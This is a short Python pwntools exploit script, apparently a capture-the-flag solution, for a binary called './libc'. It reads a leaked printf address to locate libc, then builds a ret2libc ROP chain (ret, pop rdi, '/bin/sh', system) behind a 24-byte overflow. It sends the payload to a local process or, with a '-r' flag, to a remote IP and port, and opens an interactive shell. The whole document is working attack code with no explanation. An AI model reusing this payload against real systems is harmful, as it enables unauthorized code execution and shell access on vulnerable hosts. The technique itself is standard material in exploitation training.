from pwn import *
import sys

argc = len(sys.argv)
_bin = "./libc"
context.binary = _bin
libc = ELF('./libc.so.6')

if argc >=2 and '-r' in sys.argv[1]:
    p = remote("3.131.69.179", 19283)
else:
    p = process(_bin)
e = ELF(_bin)
rop = ROP(e)

libc.address = int(p.recvline().split()[3], 16) - libc.symbols.printf

system_addr = libc.symbols['system']

rop.raw(rop.find_gadget(['ret']))
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(next(libc.search(b'/bin/sh')))
rop.raw(p64(system_addr))

offset = b"A" * 24 

payload = offset + rop.chain()

p.recvuntil(':')

p.sendline(payload)
p.interactive()
